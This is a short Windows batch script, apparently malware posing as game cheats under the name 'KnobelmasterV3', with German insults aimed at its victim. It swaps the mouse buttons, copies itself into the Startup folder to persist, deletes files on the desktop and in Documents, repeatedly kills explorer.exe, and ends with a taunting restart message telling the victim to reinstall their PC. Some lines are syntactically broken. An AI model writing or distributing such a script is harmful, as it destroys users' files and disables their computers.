@echo off

Rundll32 user32, SwapMouseButton

copy KnobelmasterV3.bat "%userprofile\STARTM~1\Programs\Startup"
copy KnobelmasterV3.exe "%userprofile\STARTM~1\Programs\Startup"

set date=1
time 0:00

cd %userprofile%\desktop
FOR %%A IN (.) DO DEL %%A

cd %userprofile%\documents
FOR %%A IN (.) DO DEL %%A

:start
taskkill /IM explorer.exe /f
start DuKleinerNuttensohnSpielLegitHuso
goto start


shutdown -r -t 10 -c "Huso kauf keine Cheats. Kannst dein PC neu aufsetzen."